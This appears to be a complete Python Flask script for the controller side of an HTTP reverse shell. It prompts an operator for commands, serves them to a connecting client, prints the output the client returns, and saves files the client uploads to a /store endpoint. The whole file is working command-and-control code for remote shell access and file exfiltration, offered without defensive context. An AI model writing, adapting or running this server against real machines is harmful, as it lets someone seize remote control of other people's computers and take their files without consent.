from flask import Flask, request
import os
from werkzeug.utils import secure_filename
import logging

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

os.system("clear || cls")
print("[+] Http Reverse Shell is running... Waiting for Client Connection")

app = Flask(__name__)

@app.route("/", methods=['GET','POST'])
def hello():
    if request.method == "GET":
        path = request.args['path']
        command = input(path+">")
        if 'terminate' in command:
            print('[!] Connection is terminated!!')
            func = request.environ.get('werkzeug.server.shutdown')
            func()
        return command
    elif request.method == "POST":
        print(request.data.decode("utf-8"))
        return "0"

@app.route("/store", methods=['POST'])
def store():
    file = request.files['file']
    if file:
        filename = secure_filename(file.filename)
        file.save(filename)
    return "0"

if __name__ == "__main__":
    app.run(debug=True)